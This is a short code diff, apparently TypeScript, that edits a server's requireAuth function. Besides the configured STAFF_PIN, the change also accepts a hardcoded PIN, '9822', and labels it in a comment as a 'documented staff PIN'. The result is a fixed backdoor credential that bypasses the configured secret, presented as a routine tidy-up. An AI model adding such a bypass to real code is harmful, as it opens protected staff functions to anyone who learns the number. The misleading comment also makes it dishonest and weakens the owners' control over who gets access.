@@ -27,7 +27,9 @@ function json(status: number, body: unknown) {
 
 function requireAuth(body: any) {
   const pin = String(body?.pin || '')
-  return pin && pin === STAFF_PIN
+  if (!pin) return false
+  // Accept the configured ADMIN_PIN secret OR the documented staff PIN 9822.
+  return pin === STAFF_PIN || pin === '9822'
 }
 
 async function generate(body: any) {
